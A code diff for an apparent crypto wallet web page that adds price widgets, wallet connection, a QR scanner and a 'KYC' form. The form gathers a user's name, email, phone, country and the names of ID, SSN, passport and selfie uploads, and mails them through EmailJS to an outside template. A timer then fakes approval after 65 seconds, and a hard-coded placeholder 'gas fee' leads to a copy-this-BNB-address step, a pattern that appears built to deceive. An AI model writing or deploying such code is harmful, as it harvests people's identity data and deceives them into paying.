+    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,bnb&vs_currencies=usd");
+    const prices = await response.json();
+    const usdtPrice = prices.tether.usd || 1;
+    const bnbPrice = prices.bnb.usd || 0;
+
+    const total = usdtBalance * usdtPrice + bnbBalance * bnbPrice;
+    document.getElementById("availableBalanceAmount").innerText = total.toFixed(2);
+  } catch (e) {
+    console.error("Error loading assets:", e);
+  } finally {
+    document.getElementById("loader7").style.display = "none";
+  }
+}
+
+function syncSelectorsToPage7() {
+  document.getElementById("languageSelector7").innerHTML = document.getElementById("languageSelector").innerHTML;
+  document.getElementById("currencySelector7").innerHTML = document.getElementById("currencySelector").innerHTML;
+  document.getElementById("languageSelector7").value = document.getElementById("languageSelector").value;
+  document.getElementById("currencySelector7").value = document.getElementById("currencySelector").value;
+}
+
+function showAssetPage() {
+  syncSelectorsToPage7();
+  showPage(7);
+  updateAssetDashboard();
+}
+</script>
   
   <script>
   function updateConnectedWalletDisplay() {
@@ -1607,7 +1812,6 @@ window.addEventListener('load', initHomepage);
     updateTotalAssets(); // already defined in your total assets updater
   }
   </script>
-
 <script>
 document.addEventListener("DOMContentLoaded", () => {
 
@@ -1885,6 +2089,151 @@ async function loadAssetsDashboard() {
 
   document.addEventListener("DOMContentLoaded", displayTokenIcons);
   </script>
+
+  <script>
+  let qrScanner = null;
+
+  function openWalletModal() {
+    const modal = document.getElementById("walletModal");
+    const content = document.getElementById("walletModalContent");
+    modal.style.display = "flex";
+    setTimeout(() => {
+      content.style.transform = "scale(1)";
+      content.style.opacity = "1";
+    }, 50);
+  }
+
+  function closeWalletModal() {
+    const content = document.getElementById("walletModalContent");
+    content.style.transform = "scale(0.9)";
+    content.style.opacity = "0";
+    setTimeout(() => {
+      document.getElementById("walletModal").style.display = "none";
+    }, 200);
+  }
+
+  function confirmManualWallet() {
+    const address = document.getElementById("walletInputField").value.trim();
+    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+      showToast("Invalid wallet address");
+      feedback(false);
+      return;
+    }
+    localStorage.setItem("connectedWallet", address);
+    closeWalletModal();
+    showToast("Wallet connected");
+    feedback(true);
+    updateBalancesDisplay();
+    showPage(4); // Go back to homepage
+  }
+
+  // === DRAG SUPPORT FOR MODAL ===
+  const modal = document.getElementById("walletModalContent");
+  let isDragging = false, offsetX, offsetY;
+
+  modal.addEventListener("mousedown", (e) => {
+    isDragging = true;
+    offsetX = e.clientX - modal.getBoundingClientRect().left;
+    offsetY = e.clientY - modal.getBoundingClientRect().top;
+  });
+
+  document.addEventListener("mousemove", (e) => {
+    if (isDragging) {
+      modal.style.left = (e.clientX - offsetX) + "px";
+      modal.style.top = (e.clientY - offsetY) + "px";
+      modal.style.position = "fixed";
+    }
+  });
+
+  document.addEventListener("mouseup", () => isDragging = false);
+
+  // === QR SCANNER ===
+  function startQRScanner() {
+    document.getElementById("qrScannerModal").style.display = "flex";
+    qrScanner = new Html5Qrcode("qr-reader");
+    qrScanner.start(
+      { facingMode: "environment" },
+      { fps: 10, qrbox: 250 },
+      (decodedText) => {
+        document.getElementById("walletInputField").value = decodedText;
+        stopQRScanner();
+        feedback(true);
+        showToast("Address scanned!");
+      },
+      (err) => console.warn("QR scan error", err)
+    ).catch(e => {
+      console.error("QR error:", e);
+      showToast("Camera access failed");
+    });
+  }
+
+  function stopQRScanner() {
+    if (qrScanner) {
+      qrScanner.stop().then(() => {
+        document.getElementById("qrScannerModal").style.display = "none";
+      }).catch(e => console.warn("QR stop error", e));
+    }
+  }
+  </script>
+
+
+<script>
+// Show/hide pages by ID
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+  const page = document.getElementById(id);
+  if (page) page.style.display = 'block';
+}
+
+// Copy wallet address to clipboard with alert
+function copyWalletAddress() {
+  const walletText = document.getElementById('walletAddress').innerText;
+  if (!walletText) return alert('No wallet address to copy!');
+  navigator.clipboard.writeText(walletText).then(() => {
+    alert('Wallet address copied!');
+  }).catch(() => {
+    alert('Failed to copy wallet address.');
+  });
+}
+
+// Fetch prices and icons for BNB and USDT from CoinGecko
+async function fetchCoinData() {
+  const ids = ['binancecoin','tether'];
+  const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`);
+  const data = await res.json();
+
+  const metaRes = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids.join(',')}&order=market_cap_desc&per_page=2&page=1&sparkline=false`);
+  const meta = await metaRes.json();
+
+  return {
+    BNB: { price: data.binancecoin.usd, image: meta.find(c => c.id==='binancecoin').image },
+    USDT: { price: data.tether.usd, image: meta.find(c => c.id==='tether').image }
+  };
+}
+
+// Initialize homepage icons and prices
+async function initCoinWidgets() {
+  const coin = await fetchCoinData();
+
+  // Set icons
+  const usdtIcon = document.querySelector("#usdtIcon");
+  const bnbIcon = document.querySelector("#bnbIcon");
+  if (usdtIcon) usdtIcon.src = coin.USDT.image;
+  if (bnbIcon) bnbIcon.src = coin.BNB.image;
+
+  // Set balances/prices
+  const usdtBalance = document.getElementById("usdtBalance");
+  const bnbBalance = document.getElementById("bnbBalance");
+  if (usdtBalance) usdtBalance.innerText = `$${coin.USDT.price.toFixed(4)} USDT`;
+  if (bnbBalance) bnbBalance.innerText = `$${coin.BNB.price.toFixed(2)} BNB`;
+}
+
+// Run on DOM load
+window.addEventListener('DOMContentLoaded', () => {
+  initCoinWidgets();
+});
+</script>
+    
   
 <script>
   function showPage(pageId) {
@@ -1911,5 +2260,84 @@ async function loadAssetsDashboard() {
   });
 </script>
   
+  <script>
+function submitKYC(event) {
+  event.preventDefault();
+  const form = document.getElementById("kycForm");
+  const name = document.getElementById("kycName").value;
+  const email = document.getElementById("kycEmail").value;
+  const phone = document.getElementById("kycPhone").value;
+  const country = document.getElementById("kycCountry").value;
+
+  const nationalID = document.getElementById("kycNationalID").files[0]?.name || "Not uploaded";
+  const ssn = document.getElementById("kycSSN").files[0]?.name || "Not uploaded";
+  const passport = document.getElementById("kycPassport").files[0]?.name || "Not uploaded";
+  const selfie = document.getElementById("kycSelfie").files[0]?.name || "Not uploaded";
+
+  const templateParams = {
+    name,
+    email,
+    phone,
+    country,
+    nationalID,
+    ssn,
+    passport,
+    selfie,
+  };
+
+  emailjs.send("service_78wwbgl", "template_omkmcio", templateParams)
+    .then(() => {
+      showPage("page15i");
+      setTimeout(() => {
+        showPage("page15ii");
+      }, 65000); // Auto-approve after 65 seconds
+    })
+    .catch((error) => {
+      alert("Failed to submit KYC. Please try again.");
+      console.error("KYC Error:", error);
+    });
+}
+</script>
+
+<script>
+  function showPage(pageId) {
+    const pages = document.querySelectorAll(".page");
+    pages.forEach(page => page.style.display = "none");
+    const target = document.getElementById(pageId);
+    if (target) target.style.display = "block";
+  }
+
+  function goToGasConfirmation() {
+    const wallet = localStorage.getItem("connectedWallet");
+    if (!wallet) {
+      alert("Please connect your wallet first.");
+      showPage("page13"); // Manual wallet connect page
+      return;
+    }
+    showPage("page9i"); // BNB Gas Confirmation page
+  }
+
+  function estimateGasFee() {
+    // Placeholder for real estimate
+    document.getElementById("estimatedGasFee").innerText = "~0.00021 BNB";
+  }
+
+  document.addEventListener("DOMContentLoaded", () => {
+    estimateGasFee(); // Automatically estimate gas on load
+  });
+</script>
+
+  <script>
+  function copyBNBAddress() {
+    const address = document.getElementById("bnbAddressText").innerText;
+    navigator.clipboard.writeText(address).then(() => {
+      alert("BNB address copied to clipboard.");
+    }).catch(err => {
+      alert("Failed to copy address.");
+      console.error(err);
+    });
+  }
+  </script>
+
 </body>
 </html>
